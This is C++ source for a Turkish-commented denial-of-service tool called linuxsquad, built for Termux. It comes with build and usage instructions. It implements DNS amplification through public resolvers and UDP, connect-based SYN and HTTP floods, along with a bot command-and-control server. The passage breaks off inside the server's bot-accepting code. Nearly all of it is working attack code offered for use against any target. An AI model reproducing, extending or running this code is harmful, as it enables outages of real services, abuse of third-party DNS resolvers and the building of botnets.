/*
 * linuxsquad.cpp - REALISTIC Termux DDoS Tool
 * 
 * GERÇEK KAPASİTE (dürüst):
 * - 1 cihaz: 50-200 Mbps
 * - 50 bot (farklı ağlar): 2.5-10 Gbps
 * 
 * Derleme (Termux):
 *   pkg update && pkg upgrade -y
 *   g++ -std=c++11 -O3 -o linuxsquad linuxsquad.cpp -lpthread
 *   
 * Kullanım:
 *   ./linuxsquad c2 <port>
 *   ./linuxsquad bot <c2_ip> <c2_port>
 *   ./linuxsquad solo <ip> <port> <süre> [tür]
 *   tür: 1=DNS, 2=UDP, 3=SYN, 4=HTTP, 5=HEPSI
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <sstream>
#include <fstream>
#include <iomanip>
#include <unordered_map>
#include <functional>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <netdb.h>

#define MAX_BOTS 50
#define FAKE_IPS 100
#define MAX_RESOLVERS 50

std::atomic<bool> running(true);
std::atomic<long long> total_packets(0);
std::atomic<long long> total_bytes(0);
std::mutex print_mtx;

// DNS Resolver'lar
std::vector<std::string> resolvers = {
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "208.67.222.222", "208.67.220.220", "9.9.9.9", "149.112.112.112",
    "64.6.64.6", "64.6.65.6", "77.88.8.8", "77.88.8.1",
    "185.228.168.9", "185.228.169.9", "156.154.70.1", "156.154.71.1",
    "8.26.56.26", "8.20.247.20", "198.101.242.72", "23.253.163.55"
};

std::vector<uint32_t> fake_ips;

struct Bot {
    int fd;
    std::string ip;
    int port;
    bool alive;
};
std::vector<Bot> bots;
std::mutex bot_mtx;

// --- YARDIMCI ---
uint32_t ip2int(const std::string& ip) {
    struct in_addr a; inet_pton(AF_INET, ip.c_str(), &a); return a.s_addr;
}
std::string int2ip(uint32_t ip) {
    struct in_addr a; a.s_addr = ip; return inet_ntoa(a);
}

void rnd_ip(uint32_t& ip) {
    uint8_t b1, b2, b3, b4;
    do {
        b1 = rand()%256; b2 = rand()%256; b3 = rand()%256; b4 = rand()%256;
    } while(b1==0||b1==10||b1==127||b1==169||b1==172||b1==192||b1==224||b1>=240);
    ip = (b4<<24)|(b3<<16)|(b2<<8)|b1;
}

// --- DNS AMPLIFICATION (en etkili) ---
void dns_flood(const std::string& target, int port, int dur, int tid) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd<0) return;
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(53);
    
    uint8_t buf[512];
    auto start = std::chrono::steady_clock::now();
    int ridx = tid % resolvers.size();
    
    while(running) {
        if(dur>0) {
            auto e = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now()-start).count();
            if(e>=dur) break;
        }
        
        for(int i=0; i<3; i++) {
            int r = (ridx+i) % resolvers.size();
            dst.sin_addr.s_addr = ip2int(resolvers[r]);
            
            // DNS query - ANY tip
            memset(buf,0,512);
            int id = rand()&0xFFFF;
            buf[0]=id>>8; buf[1]=id&0xFF;
            buf[2]=0x01; buf[5]=0x01; // 1 question
            
            int pos=12;
            std::string doms[] = {"www","mail","cdn","api","test"}; 
            std::string tlds[] = {"com","net","org"};
            std::string s = doms[rand()%5];
            buf[pos++]=s.length();
            memcpy(buf+pos,s.c_str(),s.length()); pos+=s.length();
            
            buf[pos++]=7; memcpy(buf+pos,"example",7); pos+=7;
            
            s = tlds[rand()%3];
            buf[pos++]=s.length(); 
            memcpy(buf+pos,s.c_str(),s.length()); pos+=s.length();
            buf[pos++]=0;
            
            buf[pos++]=0; buf[pos++]=255; // QTYPE ANY
            buf[pos++]=0; buf[pos++]=1;    // QCLASS IN
            
            sendto(fd,buf,pos,0,(struct sockaddr*)&dst,sizeof(dst));
            total_packets++; total_bytes+=pos;
        }
        usleep(500); // rate limit yok, ama Termux'ta zaten max 50-200 Mbps
    }
    close(fd);
}

// --- UDP FLOOD ---
void udp_flood(const std::string& target, int port, int dur, int tid) {
    int fd = socket(AF_INET,SOCK_DGRAM,0);
    if(fd<0) return;
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = ip2int(target);
    
    char pld[1472];
    for(int i=0;i<1472;i++) pld[i]=rand()&0xFF;
    
    auto start = std::chrono::steady_clock::now();
    while(running) {
        if(dur>0) {
            auto e = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now()-start).count();
            if(e>=dur) break;
        }
        int len = 100+rand()%1300;
        dst.sin_port = htons(port+(rand()%10));
        int s = sendto(fd,pld,len,0,(struct sockaddr*)&dst,sizeof(dst));
        if(s>0) { total_packets++; total_bytes+=s; }
        // usleep yok - full speed
    }
    close(fd);
}

// --- HTTP (Layer 7) ---
void http_flood(const std::string& target, int port, int dur, int tid) {
    auto start = std::chrono::steady_clock::now();
    char rbuf[4096];
    
    while(running) {
        if(dur>0) {
            auto e = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now()-start).count();
            if(e>=dur) break;
        }
        
        int fd = socket(AF_INET,SOCK_STREAM,0);
        if(fd<0) continue;
        
        struct timeval tv; tv.tv_sec=1; tv.tv_usec=0;
        setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
        setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
        
        struct sockaddr_in dst;
        dst.sin_family=AF_INET; dst.sin_port=htons(port);
        dst.sin_addr.s_addr=ip2int(target);
        
        if(connect(fd,(struct sockaddr*)&dst,sizeof(dst))==0) {
            std::string ua[] = {
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
                "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
            };
            std::string path[] = {"/","/index.php","/wp-admin","/api","/admin"};
            
            std::string req = "GET "+path[rand()%5]+"?"+std::to_string(rand()%99999)+
                             " HTTP/1.1\r\nHost: "+target+"\r\nUser-Agent: "+
                             ua[rand()%4]+"\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n";
            
            send(fd,req.c_str(),req.length(),0);
            total_packets++; total_bytes+=req.length();
            recv(fd,rbuf,sizeof(rbuf),MSG_DONTWAIT);
        }
        close(fd);
    }
}

// --- SYNK FLOOD (connect flood) ---
void syn_flood(const std::string& target, int port, int dur, int tid) {
    auto start = std::chrono::steady_clock::now();
    while(running) {
        if(dur>0) {
            auto e = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now()-start).count();
            if(e>=dur) break;
        }
        int fd = socket(AF_INET,SOCK_STREAM,0);
        if(fd<0) continue;
        
        struct timeval tv; tv.tv_sec=0; tv.tv_usec=10000;
        setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
        fcntl(fd,F_SETFL,O_NONBLOCK);
        
        struct sockaddr_in dst;
        dst.sin_family=AF_INET; 
        dst.sin_port=htons(port+(rand()%65535));
        dst.sin_addr.s_addr=ip2int(target);
        
        connect(fd,(struct sockaddr*)&dst,sizeof(dst));
        total_packets++; total_bytes+=60;
        close(fd);
    }
}

// --- STATS ---
void stats_thread(const std::string& target, int port) {
    auto start = std::chrono::steady_clock::now();
    long long lp=0, lb=0;
    
    while(running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto e = std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::steady_clock::now()-start).count();
        
        long long pps = total_packets-lp;
        long long bps = total_bytes-lb;
        long long mbps = (bps*8)/1000000;
        lp=total_packets; lb=total_bytes;
        
        std::lock_guard<std::mutex> l(print_mtx);
        std::cout << "\r\033[K[linuxsquad] " << e << "s | " 
                  << mbps << " Mbps | " << pps << " pps | "
                  << (total_bytes/1048576) << " MB total | "
                  << target << ":" << port << std::flush;
    }
}

// --- SALDIRI BAŞLAT ---
void attack(const std::string& target, int port, int dur, int dns_t, int udp_t, int syn_t, int http_t) {
    std::vector<std::thread> thr;
    
    std::cout << "\n[+] HEDEF: " << target << ":" << port 
              << " | SURE: " << dur << "s\n";
    std::cout << "[+] DNS:" << dns_t << " UDP:" << udp_t 
              << " SYN:" << syn_t << " HTTP:" << http_t << "\n";
    std::cout << "[+] NOT: Termux'ta gercek hiz 50-200 Mbps/cihaz\n";
    std::cout << "[+] 50 bot ile 2.5-10 Gbps mumkun (farkli aglarda)\n\n";
    
    running=true; total_packets=0; total_bytes=0;
    
    for(int i=0;i<dns_t;i++) thr.push_back(std::thread(dns_flood,target,port,dur,i));
    for(int i=0;i<udp_t;i++) thr.push_back(std::thread(udp_flood,target,port,dur,i));
    for(int i=0;i<syn_t;i++) thr.push_back(std::thread(syn_flood,target,port,dur,i));
    for(int i=0;i<http_t;i++) thr.push_back(std::thread(http_flood,target,port,dur,i));
    thr.push_back(std::thread(stats_thread,target,port));
    
    for(auto& t:thr) if(t.joinable()) t.join();
    running=false;
    
    std::cout << "\n[+] BITTI! " << (total_bytes/1048576) << " MB / " 
              << total_packets << " paket\n";
}

// --- C2 SERVER ---
void c2_server(int port) {
    std::cout << "\n[!] C2 SERVER baslatiliyor...\n";
    
    int srv = socket(AF_INET,SOCK_STREAM,0);
    int opt=1; setsockopt(srv,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt));
    
    struct sockaddr_in a;
    a.sin_family=AF_INET; a.sin_addr.s_addr=INADDR_ANY; a.sin_port=htons(port);
    if(bind(srv,(struct sockaddr*)&a,sizeof(a))<0) {
        std::cerr << "Bind basarisiz port " << port << "\n"; return;
    }
    listen(srv,100);
    
    // IP bul
    char hn[256]; gethostname(hn,256);
    struct hostent* he = gethostbyname(hn);
    std::string myip = "127.0.0.1";
    if(he) myip = inet_ntoa(*(struct in_addr*)he->h_addr_list[0]);
    
    std::cout << "[+] C2: " << myip << ":" << port << "\n";
    std::cout << "[+] Bot: ./linuxsquad bot " << myip << " " << port << "\n\n";
    
    // Accept thread
    std::thread([srv](){
        while(running) {
            struct sockaddr_in ca; socklen_t al=sizeof(ca);
            int cl = accept(srv,(struct sockaddr*)&ca,&al);
            if(cl<0) continue;
            std::string ip = inet_ntoa(ca.sin_addr);
            int p = ntohs(ca.sin_port);
            {
                std::lock_guard<std::mutex> l(bot_mtx);
                bots.push_back({cl,ip,p,true});
            }
            std::cout << "\n[+] BOT: " << ip
